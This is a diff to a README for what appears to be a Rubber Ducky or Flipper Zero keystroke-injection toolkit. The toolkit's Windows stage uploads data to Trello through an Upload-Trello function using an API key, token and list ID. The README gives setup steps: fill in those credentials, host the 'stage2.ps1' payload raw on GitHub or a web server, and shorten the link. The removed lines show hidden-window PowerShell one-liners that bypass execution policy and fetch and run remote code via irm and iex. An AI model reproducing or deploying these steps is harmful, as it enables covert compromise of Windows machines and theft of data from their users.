@@ -90,19 +90,20 @@ ________________________________________________________________________________
       - 1.6.1 - For linux users, go for the idlist.sh
       - 1.6.2 - For windows users, go for the idlist.ps1
 
-  - **2 - Once you have the idlist, the API key and the token, you need to modify the script or the [.txt] file**
+  - **2 - Once you have the idlist, the API key and the token, you need to modify the script or the "stage2.ps1" file**
     - 2.1 - Modifying the script, you need to add this into it ( Upload-Trello function ): 
       - $idList = "THE_ID_LIST"
       - $key = "YOUR_API_KEY_FROM"
       - $token = "YOUR_TOKEN_FROM"
+  - **3 - You need to host your file where it can be read in raw**
+      - 3.1 - Easiest way, you can host it on github, and the, via the "RAW" button, you can view the raw file.
+        - 3.1.1 - Replace the link to raw file with the link in the [.txt] file ( you can use shorturl to get a shorter link )
+      - 3.2 - Host the raw file wherever you want on a webserver accesible via internet.
+        - 3.2.1 - Replace the link to raw file with the link in the [.txt] file ( you can use shorturl to get a shorter link )
 
-    - 2.2 - Modifying the [.txt] file : 
-      - ```powershell -w h -NoP -Ep Bypass $token='';$key='';$idList='';irm https://shorturl.at/wBFLV | iex``` for W1ns1d3r_f4st_Tr3ll0 ( line 23 )
-      - ```powershell -w h -NoP -Ep Bypass $token='';$key='';$idList='';irm https://shorturl.at/gpvF5 | iex``` for W1ns1d3r_st4gg3d_Tr3ll0 ( line 53 )
+    - **4 - Put the modified [.txt] file into your Rubber Ducky or Flipper Zero**
 
-    - **3 - Put the modified [.txt] file into your Rubber Ducky or Flipper Zero**
-
-    - **4 - Enjoy !**
+    - **5 - Enjoy !**
 
 # Releases
 
